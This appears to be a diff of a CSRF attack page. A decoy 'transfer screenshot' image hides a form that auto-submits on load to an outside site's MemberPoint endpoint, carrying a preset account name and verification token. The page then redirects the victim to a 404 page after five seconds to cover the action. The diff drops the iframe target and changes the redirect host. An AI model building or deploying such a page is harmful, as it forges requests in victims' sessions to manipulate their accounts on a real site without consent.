@@ -30,7 +30,7 @@
   <img src="transfer_proof.png" alt="转账截图">
 
   <!-- ✅ 表单：提交到目标站，响应显示在 iframe 中 -->
-  <form id="csrfForm" method="POST" target="resultFrame" action="https://ad721.nb200.net/index.php?s=/MemberPoint/index">
+  <form id="csrfForm" method="POST" action="https://ad721.nb200.net/index.php?s=/MemberPoint/index">
     <input type="hidden" name="decide" value="">
     <input type="hidden" name="checkVerifc" value="4fe83a323debe74285b611d1a3c2fb83">
     <input type="hidden" name="memberAccount" value="n1a8899">
@@ -47,22 +47,18 @@
   </form>
 
   <!-- ✅ iframe：不隐藏，用于展示响应内容 -->
-  <iframe name="resultFrame" id="resultFrame"></iframe>
+  <iframe name="resultFrame" width="100%" height="600px" style="border: 1px solid #ccc;"></iframe>
 
   <script>
-    // 1. 页面加载完成时立即提交表单
     window.onload = () => {
-      console.log("✅ 页面加载，提交表单...");
+      // 自动提交表单
       document.getElementById("csrfForm").submit();
-    };
 
-    // 2. 等 iframe 加载完毕 → 再倒计时 5 秒跳转
-    document.getElementById("resultFrame").addEventListener("load", () => {
-      console.log("📥 iframe 加载完毕，5 秒后跳转到 404...");
+      // 5 秒后无条件跳转 404 页面（无论结果如何）
       setTimeout(() => {
-        window.location.href = "https://ad721.nb200.net/404.html";
+        window.location.href = "https://nb113.net/404.html";
       }, 5000);
-    });
+    };
   </script>
 
 </body>
